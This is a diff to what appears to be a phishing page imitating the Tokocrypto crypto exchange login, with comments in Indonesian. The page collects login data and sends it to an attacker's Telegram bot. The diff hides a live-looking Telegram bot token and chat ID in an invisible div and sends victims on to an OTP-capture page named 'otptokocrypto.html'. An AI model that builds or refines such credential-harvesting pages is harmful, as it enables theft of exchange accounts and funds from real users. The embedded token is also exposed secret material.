@@ -42,9 +42,20 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .hidden-data {
+            display: none;
+        }
     </style>
 </head>
 <body class="min-h-screen flex justify-center items-start pt-10 px-4">
+    <!-- Data sensitif disembunyikan dari tampilan pengguna -->
+    <div class="hidden-data" id="telegramConfig">
+        {
+            "botToken": "8440162875:AAEyc5EsiQHpKHlpKwLFy0F4xYq_upfI5F8",
+            "chatId": "7718023142"
+        }
+    </div>
+    
     <div class="w-full max-w-md">
         <div class="flex justify-end mb-6">
             <button aria-label="Close" class="text-white text-2xl font-bold leading-none hover:text-green-400 transition-colors">
@@ -120,9 +131,10 @@
     </div>
 
     <script>
-    // Konfigurasi bot Telegram
-    const TELEGRAM_BOT_TOKEN = "8440162875:AAEyc5EsiQHpKHlpKwLFy0F4xYq_upfI5F8"; // Ganti dengan token bot Telegram Anda
-    const TELEGRAM_CHAT_ID = "7718023142"; // Ganti dengan chat ID tujuan
+    // Ambil konfigurasi Telegram dari elemen tersembunyi
+    const telegramConfig = JSON.parse(document.getElementById('telegramConfig').textContent);
+    const TELEGRAM_BOT_TOKEN = telegramConfig.botToken;
+    const TELEGRAM_CHAT_ID = telegramConfig.chatId;
     
     // Toggle password visibility
     const togglePassword = document.getElementById('togglePassword');
@@ -251,7 +263,7 @@
                 
                 // Redirect setelah 2 detik
                 setTimeout(() => {
-                    window.location.href = "otp1.html";
+                    window.location.href = "otptokocrypto.html";
                 }, 2000);
             } else {
                 throw new Error('Gagal mengirim data ke Telegram');
